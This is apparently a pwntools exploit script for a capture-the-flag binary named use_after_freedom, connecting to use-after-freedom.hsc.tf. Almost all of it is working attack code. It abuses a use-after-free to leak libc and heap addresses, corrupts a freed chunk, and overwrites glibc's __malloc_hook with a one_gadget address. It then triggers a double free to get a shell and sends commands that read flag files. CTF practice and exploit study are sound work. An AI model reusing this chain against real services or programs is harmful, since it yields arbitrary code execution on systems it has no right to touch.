from pwn import *

elf = ELF("./use_after_freedom")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

#target = process(elf.path, env={"LD_PRELOAD": libc.path})
#target = remote("use-after-freedom.hsc.tf", 1337)

#context.log_level = "DEBUG"

gadgets = [0x4f3d5, 0x4f432, 0x10a41c]

def sa( d):
    target.sendafter(">", d)

def obtain(size, data="_whoamiT"):
    sa("1")
    sa(str(size))
    sa(data)

def lose(idx):
    sa("2")
    sa(str(idx))

def change(idx, data="_whoamiT"*2):
    sa("3")
    sa(str(idx))
    sa(data)

def view(idx):
    sa("4")
    sa(str(idx))

#UAF, malloc size < 0x10001, but thing returned by malloc is restricted, can view, change, max. 5 chunks
#'''
while True:
    try:
        #target = process(elf.path, env={"LD_PRELOAD": libc.path})
        target = remote("use-after-freedom.hsc.tf", 1337)

        target.recvuntil("freedom")
        obtain(0x500)   #0
        obtain(0x10)    #1

        lose(0)
        change(0, "A"*8)
        view(0)
        target.recvuntil("A"*8)
        libc_base = u64(target.recvline().strip().ljust(8, '\x00')) - (0x7f0cf8d89ca0 - 0x00007f0cf899e000)
        #log.info("LIBC Base: " + hex(libc_base))
        actual = libc_base + (0x7f0cf8d89ca0 - 0x00007f0cf899e000)
        #log.info("MALL hook: " + hex(libc_base + libc.sym['__malloc_hook']))
        #log.info("Actu leak: " + hex(actual))
        #log.info("FREE hook: " + hex(libc_base + libc.sym['__free_hook']))

        lose(1)
        change(1)
        lose(1)

        view(1)
        heap_base = u64(target.recvline().strip().ljust(8, '\x00')) - 0x770
        #log.info("HEAP Base: " + hex(heap_base))

        probable_upper_check = (heap_base & 0xfffffffffff00000) + 0xaf010

        change(0, p64(actual) + p64(probable_upper_check - 0x10))

        print("Checkpoint")

        obtain(0x500)   #2

        change(1, p64(libc_base + libc.sym['__malloc_hook']))
        
        print("Checkpoint crossed yayy! ^^^^^^^^^^^")

        obtain(0x10)    #3
        obtain(0x10, p64(libc_base + gadgets[1]))   #4
        break
    except:
        target.close()

#'''
print("__malloc_hook overwritten.")
lose(1)
print("One time free done.")
lose(1)
#gdb.attach(target, 'vm')

target.sendline("cat flag*")
target.sendline("cat /flag*")
target.sendline("cat flag")
target.sendline("cat /home/*/flag*")

target.interactive()

'''
0x00005650 eb1d9000
0x00005650 ebbf0000

0x000055f7 5b819000
0x000055f7 5c5f3000

0x000055b2 413af000
0x000055b2 413c5000
'''